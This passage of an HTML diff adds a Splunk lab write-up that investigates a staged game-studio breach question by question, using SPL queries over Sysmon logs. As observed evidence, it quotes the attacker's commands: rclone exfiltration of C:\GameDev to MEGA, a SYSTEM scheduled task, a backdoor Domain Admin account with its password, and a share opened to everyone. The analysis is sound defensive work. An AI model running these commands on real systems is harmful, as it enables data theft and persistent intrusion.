@@ -1,0 +1,1577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Splunk Investigation – EmberForge Studios | Joan Dimas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../assets/css/style.css">
+
+  <style>
+    /* Premium Additions (keeps your global theme intact) */
+
+     .argus-content p {
+  margin-bottom: 1.25rem;
+  line-height: 1.7;
+}
+
+.argus-content code {
+  background: #0f0f0f;
+  border: 1px solid #2a2a2a;
+  padding: 0.25rem 0.45rem;
+  border-radius: 6px;
+  font-family: Consolas, monospace;
+  font-size: 0.85rem;
+  color: #f5c26b;
+}
+
+.argus-content ul {
+  margin: 1rem 0 1.5rem 1.5rem;
+}
+
+.argus-content li {
+  margin-bottom: 0.6rem;
+}
+
+
+    .toc {
+      background: #161616;
+      border: 1px solid #2a2a2a;
+      border-radius: 16px;
+      padding: 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .toc h3 {
+      margin-top: 0;
+      margin-bottom: 1rem;
+    }
+
+    .toc a {
+      display: block;
+      color: var(--text-muted);
+      text-decoration: none;
+      margin-bottom: 0.4rem;
+      font-size: 0.9rem;
+      transition: color 0.2s ease;
+    }
+
+    .toc a:hover {
+      color: var(--accent);
+    }
+
+    .spl-block {
+      background: #0d0d0d;
+      border: 1px solid #2e2e2e;
+      border-left: 4px solid var(--accent);
+      border-radius: 12px;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+    }
+
+    .spl-block code {
+      color: #f5c26b;
+      font-family: Consolas, monospace;
+      font-size: 0.85rem;
+    }
+
+    details {
+      margin-bottom: 2.5rem;
+      border: 1px solid #2a2a2a;
+      border-radius: 14px;
+      padding: 1.25rem;
+      background: #181818;
+    }
+
+    summary {
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 1rem;
+      color: #fff;
+      margin-bottom: 1rem;
+    }
+
+    summary:hover {
+      color: var(--accent);
+    }
+
+    .mitre-box {
+      background: #111;
+      border: 1px solid #2a2a2a;
+      border-radius: 16px;
+      padding: 1.5rem;
+      margin-top: 3rem;
+    }
+
+    .timeline-box {
+      background: #111;
+      border: 1px solid #2a2a2a;
+      border-radius: 16px;
+      padding: 1.5rem;
+      margin-top: 3rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 1.5rem;
+    }
+
+    table th, table td {
+      border: 1px solid #2a2a2a;
+      padding: 0.75rem;
+      font-size: 0.85rem;
+    }
+
+    table th {
+      background: #1f1f1f;
+      color: var(--accent);
+      text-align: left;
+    }
+
+    table td {
+      background: #151515;
+    }
+  </style>
+</head>
+
+<body class="project-page">
+
+<div class="argus-page">
+
+<header class="argus-header">
+  <h1>Splunk Investigation – EmberForge Studios</h1>
+  <a class="back-link" href="../index.html">← Back to Writeups</a>
+</header>
+
+<main class="argus-content">
+
+<h2>Investigation Overview</h2>
+
+<p>After our investigation, we will be able to answer the following:</p>
+
+<table>
+<thead>
+<tr>
+<th>Section</th>
+<th>Question</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WHO</strong></td>
+<td>Which accounts? Which IPs?</td>
+</tr>
+<tr>
+<td><strong>WHAT</strong></td>
+<td>What actions did they take?</td>
+</tr>
+<tr>
+<td><strong>WHEN</strong></td>
+<td>What's the timeline?</td>
+</tr>
+<tr>
+<td><strong>WHERE</strong></td>
+<td>Which hosts? Which paths?</td>
+</tr>
+<tr>
+<td><strong>WHY</strong></td>
+<td>How did they get in? What's the root cause?</td>
+</tr>
+<tr>
+<td><strong>HOW</strong></td>
+<td>What was the full attack chain?</td>
+</tr>
+</tbody>
+</table>
+
+
+<h3>IOCs to Capture</h3>
+<ul>
+<li>File hashes (SHA256)</li>
+<li>Full file paths</li>
+<li>IPs and domains</li>
+<li>Command lines</li>
+<li>Account names</li>
+<li>Timestamps</li>
+</ul>
+
+<hr class="section-divider">
+
+<h2>The Situation</h2>
+
+<p>
+EmberForge Studios - a small indie game dev - just got breached. Their upcoming title <em>Neon Shadows</em> was leaked to underground forums before release.
+</p>
+
+<p>
+Lead Artist <strong>Lisa Martin</strong> reported strange behavior on her workstation after opening a file from her desktop. 48 hours later, source code was everywhere.
+</p>
+
+<p>
+You've been brought in to figure out what happened.
+</p>
+
+<!-- Executive Summary -->
+
+<div class="mitre-box">
+
+<h2>Executive Summary</h2>
+
+<p>
+EmberForge Studios experienced a multi-stage security breach that resulted in the exfiltration of proprietary source code for their upcoming title <em>Neon Shadows</em>. The initial compromise began on <code>2026-01-30 21:27:03</code> when a malicious DLL (<code>review.dll</code>) was executed on the workstation of Lead Artist <strong>Lisa Martin</strong>.
+</p>
+
+<p>
+Following initial execution, the attacker:
+</p>
+
+<ul>
+  <li>Injected into <code>notepad.exe</code> for defense evasion</li>
+  <li>Created a scheduled task (<code>WindowsUpdate</code>) for persistence</li>
+  <li>Installed <strong>AnyDesk</strong> for remote interactive access</li>
+  <li>Created a domain backdoor account (<code>svc_backup</code>)</li>
+  <li>Compressed sensitive data from <code>C:\GameDev</code></li>
+  <li>Exfiltrated the data to the <strong>MEGA</strong> cloud platform using <code>rclone</code></li>
+</ul>
+
+<p>
+Exfiltration traffic was confirmed to <code>66.203.125.15</code>, and forensic analysis identified the malicious second-stage payload (<code>update.exe</code>) on <strong>three separate hosts</strong>, confirming lateral propagation within the environment.
+</p>
+
+<p>
+The attacker also attempted anti-forensics by clearing Windows Security logs (<strong>Event ID 1102</strong>) after data exfiltration was completed.
+</p>
+
+<p>
+This investigation reconstructed the full attack chain, identified indicators of compromise (IOCs), determined the blast radius, and uncovered persistence mechanisms requiring immediate remediation.
+</p>
+
+</div>
+
+
+<hr class="section-divider">
+
+<!-- Q1 -->
+
+<details open>
+<summary>Q1 - The Payload</summary>
+
+<p>
+What malicious file was dropped on Lisa's system?<br>
+<strong>Format:</strong> filename.extension<br>
+What is the name of the malicious file that was executed?
+</p>
+
+<p><strong>Command utilized:</strong></p>
+
+<div class="spl-block">
+<code>
+index=main EventCode=1 NOT Image="*\\SplunkUniversalForwarder\\*" | table _time User Image CommandLine ParentImage Computer | sort _time
+</code>
+</div>
+
+<p>
+Upon reviewing the logs, an interesting event stands out involving 
+<code>rundll32.exe</code>:
+<br>
+<code>"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW</code>
+</p>
+
+<p>
+This indicates that <code>rundll32.exe</code> was used to execute a DLL named:
+</p>
+
+<p>
+<code>review.dll</code>
+</p>
+
+<p>
+The use of <code>rundll32.exe</code> to execute a DLL from the root of the 
+<code>D:\</code> drive is highly suspicious. The file name 
+<code>review.dll</code> does not correspond to any known legitimate Windows component, 
+making it a strong indicator of malicious activity.
+</p>
+
+<p>
+Looking further back in the timeline, at 
+<code>2026-01-30 21:23:20</code>, I observe the same user with the following file 
+in their Downloads directory:
+</p>
+
+<p>
+<code>C:\Users\lmartin.EMBERFORGE\Downloads\7z2501-x64.exe</code>
+</p>
+
+<p>
+This appears to be the 7-Zip installer. Shortly after installation, I see archive extraction activity:
+</p>
+
+<p>
+<code>"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" -spe -an -ai#7zMap13315:120:7zEvent17197</code>
+</p>
+
+<p>
+This suggests the user extracted an archive into:
+</p>
+
+<p>
+<code>C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\</code>
+</p>
+
+<p>
+Based on the timeline, the likely sequence of events is:
+</p>
+
+<ul>
+<li>The user downloads a file via Microsoft Edge</li>
+<li>Installs 7-Zip</li>
+<li>Extracts an archive named <code>EmberForge_Review</code></li>
+<li>The archive contains <code>review.dll</code></li>
+<li><code>review.dll</code> is executed via <code>rundll32.exe</code></li>
+</ul>
+
+<p>
+The malicious file executed on the system was:
+</p>
+
+<p>
+<code>review.dll</code>
+</p>
+
+</details>
+
+
+<!-- Q2 -->
+
+<details>
+<summary>Q2 - The Victim</summary>
+
+<p>
+Whose account ran the malware? This account needs an immediate password reset.<br>
+<strong>Format:</strong> username<br>
+Which user account ran the malicious file?
+</p>
+
+<p>
+From the process execution logs, I can clearly see that the malicious DLL was executed in the context of the following user:
+</p>
+
+<p>
+<code>EMBERFORGE\lmartin</code>
+</p>
+
+<p>
+Specifically, the <code>rundll32.exe</code> execution of <code>review.dll</code> was associated with this account.</p>
+
+<p>
+This confirms that the malware execution originated from the account:
+</p>
+
+<p>
+<code>lmartin</code>
+</p>
+
+<p>
+Further context can be derived from the system involved:
+</p>
+
+<p>
+<code>EC2AMAZ-B9GHHO6.emberforge.local</code>
+</p>
+
+<p>
+This identifies the compromised host within the <code>emberforge.local</code> domain where the malicious activity occurred.
+</p>
+
+<p>
+Answer == <code>lmartin</code>
+</p>
+
+</details>
+
+<!-- Q3 -->
+
+<details>
+<summary>Q3 - T-Zero</summary>
+
+<p>
+When did this all start? This timestamp anchors your entire timeline.<br>
+<strong>Format:</strong> YYYY-MM-DD HH:MM<br>
+When did the attack begin?
+</p>
+
+<p>
+To determine the start of the attack, I look for the earliest confirmed malicious execution event.
+</p>
+
+<p>
+From the logs, the first clear indicator of compromise is the execution of the malicious DLL:
+</p>
+
+<p>
+<code>"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW</code>
+</p>
+
+<p>
+This event occurred at:
+</p>
+
+<p>
+<code>2026-01-30 21:27:03</code>
+</p>
+
+<p>
+This timestamp marks the initial execution of attacker-controlled code on the system. While there was prior activity (such as downloading and extracting files), this is the first confirmed moment where malicious code was executed.
+</p>
+
+<p>
+This timestamp serves as the anchor point for building the full incident timeline, including reconnaissance, privilege escalation, persistence, lateral movement, and data exfiltration.
+</p>
+
+<p>
+Final Answer == <code>2026-01-30 21:27</code>
+</p>
+
+</details>
+
+
+<!-- Q4 -->
+
+<details>
+<summary>Q4 - First IOC</summary>
+
+<p>
+Grab the SHA256 hash of the malicious file. This goes on your blocklist.<br>
+<strong>Format:</strong> SHA256 hash<br>
+What is the SHA256 hash of the malicious payload?
+</p>
+
+<p>
+To obtain the hash of the malicious file, I reviewed the event corresponding to the execution of <code>review.dll</code>. By expanding the event details in the log entry, the file metadata section displayed the calculated hashes, including the SHA256 value.
+</p>
+
+<p>
+The SHA256 hash associated with the malicious payload is:
+</p>
+
+<p>
+<code>0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1</code>
+</p>
+
+<p>
+This hash should be added to the organization’s blocklist and used for threat hunting across the environment to identify any additional systems that may have encountered the same payload.
+</p>
+
+</details>
+
+
+<!-- Q5 -->
+
+<details>
+<summary>Q5 - How It Started</summary>
+
+<p>
+What launched the malware? The parent process tells you how the attack began.<br>
+<strong>Format:</strong> filename.exe<br>
+What was the parent process?
+</p>
+
+<p>
+To determine how the malware was launched, I analyzed the process creation logs (Event ID 1). These logs provide visibility into both the newly created process and its parent process.
+</p>
+
+<p>
+By reviewing the event associated with the execution of:
+</p>
+
+<p>
+<code>rundll32.exe D:\review.dll,StartW</code>
+</p>
+
+<p>
+I examined the <code>ParentImage</code> field. This can be done either by expanding the event details directly or by using the <code>table</code> command in Splunk and including the <code>ParentImage</code> field.
+</p>
+
+<p>
+The logs show that the parent process responsible for launching the malicious execution was:
+</p>
+
+<p>
+<code>explorer.exe</code>
+</p>
+
+<p>
+This indicates that the malware was initiated from a user-driven action, likely through a double-click or interaction within the Windows graphical interface.
+</p>
+
+</details>
+
+
+<!-- Q6 -->
+
+<details>
+<summary>Q6 - Living Off the Land</summary>
+
+<p>
+The attacker used a built-in Windows binary to run their code. Which one?<br>
+<strong>Format:</strong> filename.exe<br>
+What Windows binary executed the malicious payload?
+</p>
+
+<p>
+Reviewing the initial malicious execution event, I observe the following command:
+</p>
+
+<p>
+<code>"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW</code>
+</p>
+
+<p>
+This confirms that the attacker leveraged the legitimate Windows binary:
+</p>
+
+<p>
+<code>rundll32.exe</code>
+</p>
+
+<p>
+<code>rundll32.exe</code> is a trusted Windows utility designed to execute functions exported from DLL files. Because it is a signed, built-in system binary, it is commonly abused by attackers as a “Living-off-the-Land” technique to evade detection and blend in with legitimate system activity.
+</p>
+
+<p>
+In this case, <code>rundll32.exe</code> was used to execute the malicious <code>review.dll</code> payload.
+</p>
+
+</details>
+
+
+<!-- Q7 -->
+
+<details>
+<summary>Q7 - C2 Domain</summary>
+
+<p>
+What domain is the malware talking to?<br>
+<strong>Format:</strong> full domain<br>
+What domain did the malware beacon to?
+</p>
+
+<p>
+To identify the domain the malware communicated with, I pivot from our established compromise timestamp:
+</p>
+
+<p>
+<code>2026-01-30 21:27:03</code>
+</p>
+
+<p>
+This marks the execution of the malicious <code>review.dll</code> payload. From here, the next step is to investigate network activity occurring immediately after execution.
+</p>
+
+<p>
+Since I are working with Sysmon logs, I focus on:
+</p>
+
+<ul>
+  <li><strong>EventCode 3</strong> – Network connections</li>
+  <li><strong>EventCode 22</strong> – DNS queries</li>
+</ul>
+
+<p>
+To identify suspicious DNS activity following the initial execution, the following query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=22 Computer=EC2AMAZ-B9GHHO6.emberforge.local earliest="01/30/2026:21:27:03" | table _time Computer QueryName | sort _time | dedup QueryName</code>
+</div>
+
+<p>
+This query filters for DNS queries occurring after the malicious DLL execution on the compromised host. By reviewing the newly resolved domains during this timeframe, two recent queries stood out.
+</p>
+
+<p>
+One of the most recently resolved domains immediately following execution was:
+</p>
+
+<p>
+<code>cdn.cloud-endpoint.net</code>
+</p>
+
+<p>
+This DNS resolution occurred at:
+</p>
+
+<p>
+<code>2026-01-30 21:27:08</code>
+</p>
+
+<p>
+The close proximity to the initial payload execution strongly indicates this domain was contacted as part of the malware’s beaconing behavior.
+</p>
+
+<p>
+Final Answer == <code>cdn.cloud-endpoint.net</code>
+</p>
+
+</details>
+
+
+<!-- Q8 -->
+
+<details>
+<summary>Q8 - C2 IP</summary>
+
+<p>
+Domains change. Where did the traffic actually go?<br>
+<strong>Format:</strong> X.X.X.X<br>
+What is the IP address of the C2 server?
+</p>
+
+<p>
+To determine the actual Command and Control (C2) destination, I pivot from DNS activity to direct network connections. Since domains can resolve to multiple IP addresses and may change over time, identifying the outbound connection IP provides stronger evidence of C2 communication.
+</p>
+
+<p>
+Using Sysmon logs, I focus on: <strong>EventCode 3</strong> (Network connections established)
+</p>
+
+<p>
+The following query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=3 Computer=EC2AMAZ-B9GHHO6.emberforge.local earliest="01/30/2026:21:27:03" | stats count by _time, SourceIp, DestinationIp, SourcePort, DestinationPort | sort _time</code>
+</div>
+
+<p>
+From the results, I observed repeated outbound HTTPS connections beginning at:
+</p>
+
+<p>
+<code>2026-01-30 22:30:51</code>
+</p>
+
+<p>
+The source system: <code>10.1.173.145</code><br>
+Was establishing connections to: <code>104.21.30.237</code><br>
+Over destination port: <code>443</code>
+</p>
+
+<p>
+Port 443 indicates encrypted HTTPS traffic, which is commonly used by malware to blend in with legitimate web traffic and avoid detection.
+</p>
+
+<p>
+These connections were consistent and repeated, indicating beaconing behavior rather than a single benign web request. Additionally, at: <code>2026-01-30 22:21:45</code>
+</p>
+
+<p>
+There was a change in destination IP and port range (<code>50001–50003</code>), which may indicate either fallback C2 infrastructure or secondary communication channels. However, the consistent HTTPS traffic to <code>104.21.30.237</code> represents the primary C2 server identified in this timeline.
+</p>
+
+</details>
+<hr class="section-divider">
+<!-- NEXT: Q9 -->
+
+<!-- Q9 -->
+
+<details>
+<summary>Q9 - Second Stage</summary>
+
+<p>
+The main payload was just the start. Something else got dropped.<br>
+<strong>Format:</strong> C:\full\path\filename.exe<br>
+What is the full path of the dropped executable?
+</p>
+
+<p>
+To identify the additional payload, I first analyzed <strong>EventCode 11 (File Creation)</strong> events. However, this did not yield any direct results related to the dropped executable.
+</p>
+
+<p>
+Since the initial execution timestamp was already established as:
+</p>
+
+<p>
+<code>2026-01-30 21:27:03</code>
+</p>
+
+<p>
+I pivoted back to <strong>EventCode 1 (Process Creation)</strong> events and focused on:
+</p>
+
+<ul>
+  <li>Activity occurring after the initial compromise</li>
+  <li>The compromised host (<code>EC2AMAZ-B9GHHO6.emberforge.local</code>)</li>
+  <li>The compromised user account</li>
+  <li>Suspicious command-line arguments referencing executables, DLLs, or scripts</li>
+</ul>
+
+<p>
+To surface potentially malicious artifacts, I used the following query:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=1 NOT Image="*\\SplunkUniversalForwarder\\*" earliest="01/30/2026:21:27:03" | where like(CommandLine, "%.exe%") OR like(CommandLine, "%.dll%") OR like(CommandLine, "%.ps1%") | stats count by _time, ParentImage, Image, CommandLine, Computer</code>
+</div>
+
+<p>
+This broad query helped identify additional suspicious activity following the execution of <code>review.dll</code>.
+</p>
+
+<p>
+During analysis, several interesting behaviors were observed, including:
+</p>
+
+<ul>
+  <li><code>rundll32.exe</code> was seen spawning <code>cmd.exe, </code></li>
+  <li>Interacting with <code>fodhelper.exe</code> (UAC bypass behavior) and </li>
+  <li>Spawning child processes such as <code>notepad.exe</code></li>
+</ul>
+
+<p>
+However, the critical discovery came from a scheduled task creation event.<br>
+At: <code>2026-01-30 21:37:16</code>
+</p>
+
+<p>
+I observed the following command:
+</p>
+
+<p>
+<code>schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system</code>
+</p>
+
+<p>
+This command reveals:
+</p>
+
+<ul>
+  <li>A new scheduled task named <strong>WindowsUpdate</strong></li>
+  <li>Configured to execute: <code>C:\Users\Public\update.exe</code></li>
+  <li>Triggered at system startup (<code>/sc onstart</code>)</li>
+  <li>Running with <strong>SYSTEM privileges</strong> (<code>/ru system</code>)</li>
+</ul>
+
+<p>
+This confirms that a secondary executable was dropped to:
+</p>
+
+<p>
+<code>C:\Users\Public\update.exe</code>
+</p>
+
+<p>
+The naming of the task (<code>WindowsUpdate</code>) is an attempt to blend in with legitimate system tasks, while the location (<code>C:\Users\Public\</code>) is a common attacker writeable directory.
+</p>
+
+<div class="spl-block">
+<code>Tip: To identify additional scheduled task creation events in Windows Security logs, filter for Event ID 4698.</code>
+</div>
+
+</details>
+
+<!-- Q10 -->
+
+<details>
+<summary>Q10 - Second IOC</summary>
+
+<p>
+Hash the second stage. Another IOC for your list.<br>
+<strong>Format:</strong> SHA256 hash<br>
+What is the SHA256 hash of the dropped executable?
+</p>
+
+<p>
+To obtain the hash of the second-stage payload, I searched for process creation events where the <code>Image</code> field contained:
+</p>
+
+<div class="spl-block">
+<code>update.exe</code>
+</div>
+
+<p>
+After locating the relevant event, I expanded the event details and reviewed the file metadata section. The log entry included calculated hashes for the executable, including the SHA256 value.
+</p>
+
+<p>
+The SHA256 hash associated with the dropped executable is:
+</p>
+
+<div class="spl-block">
+<code>060F3B8431316753ECE7B1EF664283F70D79FFC0A2D8F553EAD289C034DB9EDB</code>
+</div>
+
+<p>
+This hash should be added to the organization’s blocklist and used for threat hunting across the environment to determine whether the same payload was executed on additional systems.
+</p>
+
+</details>
+
+<!-- Q11 -->
+
+<details>
+<summary>Q11 - Process Injection</summary>
+
+<p>
+The beacon moved into a legitimate process to stay hidden. Which one?<br>
+<strong>Format:</strong> filename.exe<br>
+What process did the beacon inject into?
+</p>
+
+<p>
+To identify potential process injection activity, I analyzed <strong>Sysmon EventCode 8</strong>, which logs <code>CreateRemoteThread</code> events, wuich is a common indicator of process injection.
+</p>
+
+<p>
+During this review, an interesting event was observed at:
+</p>
+
+<p>
+<code>2026-01-30 21:32:42</code>
+</p>
+
+<p>
+The logs showed:<br>
+<strong>Source Process:</strong> <code>rundll32.exe</code><br>
+<strong>Target Process:</strong> <code>C:\Windows\System32\notepad.exe</code>
+</p>
+
+<p>
+This indicates that <code>rundll32.exe</code> injected code into <code>notepad.exe</code>, a legitimate Windows process. Process injection into benign system binaries is a common defense evasion technique used by attackers to blend malicious activity with trusted processes
+</p>
+
+<p>
+This behavior confirms that the beacon migrated into a legitimate Windows process to remain hidden.
+</p>
+
+</details>
+
+<!-- Q12 -->
+
+<details>
+<summary>Q12 - User Enumeration</summary>
+
+<p>
+Attackers need to know who's on the network. What command did they run?
+</p>
+
+<p>
+<strong>Format:</strong> full command
+</p>
+
+<p>
+What command enumerated domain users?
+</p>
+
+<p>
+Given the attacker’s demonstrated use of native Windows binaries throughout the intrusion, I focused on identifying reconnaissance activity performed using built-in tools.
+</p>
+
+<p>
+To surface potential enumeration commands, I executed the following query against <strong>EventCode 1 (Process Creation)</strong> logs:
+</p>
+
+<div class="spl-block">
+<code>index="main" EventCode=1  (Image="*\\ipconfig.exe" OR Image="*\\net.exe" OR Image="*\\whoami.exe"  OR Image="*\\netstat.exe" OR Image="*\\nbtstat.exe"  OR Image="*\\hostname.exe" OR Image="*\\tasklist.exe") | stats count by Image, CommandLine | sort - count</code>
+</div>
+
+<p>
+This query highlights commonly abused native utilities frequently used for reconnaissance during post-compromise activity.
+</p>
+
+<p>
+From the results, several commands were identified, including:
+</p>
+
+<table>
+<thead>
+<tr>
+<th>Image</th>
+<th>CommandLine</th>
+<th>count</th>
+</tr>
+</thead>
+<tbody>
+<tr><td>C:\Windows\System32\whoami.exe</td><td>whoami</td><td>3</td></tr>
+<tr><td>C:\Windows\System32\HOSTNAME.EXE</td><td>hostname</td><td>2</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net use Z: /delete</td><td>2</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!</td><td>2</td></tr>
+<tr><td>C:\Windows\System32\ipconfig.exe</td><td>ipconfig /all</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net group "Domain Admins" svc_backup /add /domain</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net share tools /delete</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net share tools=C:\Users\Public /grant:everyone,full</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net start AnyDesk</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net stop AnyDesk</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net user svc_backup P@ssw0rd123! /add /domain</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net group "Domain Admins" /domain</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\net.exe</td><td>net user /domain</td><td>1</td></tr>
+<tr><td>C:\Windows\System32\whoami.exe</td><td>whoami /priv</td><td>1</td></tr>
+</tbody>
+</table>
+
+<p>
+The command specifically responsible for enumerating domain users was: <code>net user /domain</code>
+</p>
+
+<p>
+This command queries Active Directory and lists all user accounts in the domain. Its presence in the logs confirms that the attacker was performing domain account discovery as part of their reconnaissance phase.
+</p>
+
+<p>
+I also observe additional highly suspicious commands, including the creation of domain user accounts, network share mapping, and access to shared folders.
+</p>
+
+</details>
+
+<hr class="section-divider">
+<!-- NEXT: Q13 -->
+
+<!-- Q13 -->
+
+<details>
+<summary>Q13 - Targeting Admins</summary>
+
+<p>
+After listing users, they looked for the high-value targets. What command?<br>
+<strong>Format:</strong> full command<br>
+What command identified privileged accounts?
+</p>
+
+<p>
+Following domain user enumeration, the next logical step for an attacker is to identify privileged accounts within the environment.
+To determine this, I reviewed the previously identified reconnaissance commands from the previous question. Within there, I find the following command:
+</p>
+
+<div class="spl-block">
+<code>net group "Domain Admins" /domain</code>
+</div>
+
+<p>
+This command queries Active Directory and returns the members of the <strong>Domain Admins</strong> group. This is one of the most privileged security groups in a Windows domain environment.
+</p>
+
+<p>
+By executing this command, the attacker was specifically identifying high-value accounts with administrative privileges.
+</p>
+
+</details>
+
+<!-- Q14 -->
+
+<details>
+<summary>Q14 - Scheduled Task</summary>
+
+<p>
+They created a scheduled task to survive reboots. What's it called?<br>
+<strong>Format:</strong> task name<br>
+What scheduled task was created for persistence?
+</p>
+
+<p>
+To identify persistence mechanisms, I searched for scheduled task creation activity using <strong>EventCode 1 (Process Creation)</strong> and filtering for <code>schtasks.exe</code>.
+</p>
+
+<p>
+The following query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=1 Image="*\\schtasks.exe" | table _time, User, CommandLine | sort _time</code>
+</div>
+
+<p>
+This returned the following command:
+</p>
+
+<p>
+<code>schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system</code>
+</p>
+
+<p>
+From this command, I can extract the task name specified by the <code>/tn</code> parameter: <code>WindowsUpdate</code>
+</p>
+
+<p>
+This task was configured to:
+</p>
+
+<ul>
+  <li>Execute <code>C:\Users\Public\update.exe</code></li>
+  <li>Run at system startup (<code>/sc onstart</code>)</li>
+  <li>Execute with SYSTEM privileges (<code>/ru system</code>)</li>
+</ul>
+
+<p>
+The naming of the task (<code>WindowsUpdate</code>) is an attempt to masquerade as a legitimate Windows component, helping the attacker maintain persistence while blending in with normal system activity.
+</p>
+
+<p>
+Additionally, scheduled task creation events can also be identified in Windows Security logs using <strong>Event ID 4698</strong>, which specifically logs task creation.
+</p>
+
+</details>
+
+<!-- Q15 -->
+
+<details>
+<summary>Q15 - Plan B</summary>
+
+<p>
+They also installed a legitimate remote access tool. If you lose the C2, you still have this.<br>
+<strong>Format:</strong> tool name<br>
+What remote access software was deployed?
+</p>
+
+<p>
+To identify additional persistence or fallback access mechanisms, I analyzed <strong>EventCode 11 (File Creation)</strong> events to determine whether any new executables were written to disk.
+</p>
+
+<p>
+The following simple query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=11 | stats count by TargetFilename</code>
+</div>
+
+<p>
+Reviewing the results revealed the creation of the following file:
+</p>
+
+<p>
+<code>C:\ProgramData\AnyDesk\AnyDesk.exe</code>
+</p>
+
+<p>
+The presence of <code>AnyDesk.exe</code> in the <code>ProgramData</code> directory indicates that the attacker installed <strong>AnyDesk</strong>, a legitimate remote access tool commonly abused by threat actors for persistent interactive access.
+</p>
+
+</details>
+
+<!-- Q16 -->
+
+<details>
+<summary>Q16 - Staging</summary>
+
+<p>
+To identify how the attacker staged data prior to exfiltration, I searched for process creation events involving compression or archiving activity.
+</p>
+
+<p>
+The following query was used:
+</p>
+
+<div class="spl-block">
+<code>index=main EventCode=1  | search CommandLine="*zip*" OR CommandLine="*compress*" OR CommandLine="*rclone*" | table _time User Image CommandLine | sort _time</code>
+</div>
+
+<p>
+This query highlights compression activity and potential exfiltration tooling. From the results, the following PowerShell command was identified:
+</p>
+
+<div class="spl-block">
+<code>=powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"`=</code>
+</div>
+
+<p>
+and
+</p>
+
+<div class="spl-block">
+<code>C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v</code>
+</div>
+
+<p>
+This confirms that the attacker compressed the directory <code>C:\GameDev</code> Into the archive: <code>C:\Users\Public\gamedev.zip</code>.
+</p>
+
+</details>
+
+<hr class="section-divider">
+<!-- NEXT: Q17 -->
+
+<!-- Q17 -->
+
+<details>
+<summary>Q17 - Exfil Tool</summary>
+
+<p>
+What tool did they use to send the data out?<br>
+<strong>Format:</strong> tool name<br>
+What tool was used for exfiltration?
+</p>
+
+<p>
+From the logs(as overserved in Q16), multiple executions of the following binary were observed:
+</p>
+
+<p>
+<code>C:\Users\Public\rclone.exe</code>
+</p>
+
+<p>
+Commands associated with this binary included copying data to a remote MEGA cloud destination, such as:
+</p>
+
+<div class="spl-block">
+<code>rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v</code>
+</div>
+
+<p>
+<code>rclone</code> is a legitimate file synchronization tool that supports numerous cloud providers and is frequently abused by attackers for data exfiltration due to its portability and encrypted transfer capabilities.
+</p>
+
+</details>
+
+<!-- Q18 -->
+
+<details>
+<summary>Q18 - Destination</summary>
+
+<p>
+Where did they send the stolen data?<br>
+<strong>Format:</strong> cloud provider name<br>
+What cloud storage received the data?
+</p>
+
+<p>
+To determine the exfiltration destination, I reviewed the <code>rclone</code> command-line activity..
+</p>
+
+<p>
+The following command clearly shows the remote destination:
+</p>
+
+<div class="spl-block">
+<code>C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v</code>
+</div>
+
+<p>
+Additionally, I observed credentials being supplied for a MEGA account:
+</p>
+
+<p>
+<code>--mega-user jwilson.vhr@proton.me</code>
+</p>
+
+<p>
+In <code>rclone</code>, the prefix <code>mega</code> refers to the <strong>MEGA</strong> cloud storage provider. This confirms that the attacker uploaded the stolen data to a MEGA account under their control.
+</p>
+
+</details>
+
+<!-- Q19 -->
+
+<details>
+<summary>Q19 - The Target</summary>
+
+<p>
+What folder did they want?<br>
+<strong>Format:</strong> C:\path\folder<br>
+What directory was targeted for theft?
+</p>
+
+<p>
+I again observe this activity in Question 16, specifically in the following command:
+</p>
+
+<div class="spl-block">
+<code>C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v</code>
+</div>
+
+<p>
+From this command, it is clear that the threat actor was targeting the <code>C:\GameDev</code> directory for exfiltration. The exfiltration activity began at approximately:
+</p>
+
+<p>
+<code>2026-01-30 23:07:45</code>
+</p>
+
+<p>
+This timestamp marks the initial attempt to transfer data from the compromised system to the attacker-controlled MEGA cloud storage account.
+</p>
+
+</details>
+
+<!-- Q20 -->
+
+<details>
+<summary>Q20 - Exfil IP</summary>
+
+<p>
+Where did the data actually go?<br>
+<strong>Format:</strong> X.X.X.X<br>
+What IP received the exfiltrated data?
+</p>
+
+<p>
